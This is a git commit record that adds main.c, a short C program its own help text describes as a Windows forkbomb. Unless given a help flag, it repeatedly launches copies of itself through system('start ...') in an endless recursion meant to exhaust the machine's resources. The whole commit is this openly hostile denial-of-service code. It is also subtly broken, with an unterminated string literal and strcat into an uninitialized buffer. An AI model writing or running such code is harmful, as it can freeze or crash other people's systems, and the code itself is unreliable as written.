e7302ade8c7aa1e3fc22c40cb98d3e96679ccb89
poly000 <34085039+poly000@users.noreply.github.com>
2019-10-28 16:14:07 +0800

    Create main.c

---
+++ main.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdnoreturn.h>
+#include <string.h>
+
+char * cmd;
+noreturn inline static void forkbomb(void);
+
+int main (int argc,char * argv[]) {
+  if (argc != 1) {
+    if (strcmp(argv[1],"-h") == 0 || strcmp(argv[1],"--help") == 0) {
+      printf("This is a forkbomb for windows,\n
+             "\t-h,--help: show this help;\n"
+             "\tdefault: run forkbomb.\n");
+      return 4;
+    }
+  }
+  if (cmd = malloc(sizeof(char) * (strlen(argv[0])+7)) {
+    strcat(cmd,"start ");
+    strcat(cmd,*argv);
+    forkbomb();
+  } else
+    printf("Memory alloc failed.\n");
+  return 1;
+}
+
+noreturn inline static void forkbomb(void) {
+  system(cmd);
+  forkbomb();
+}
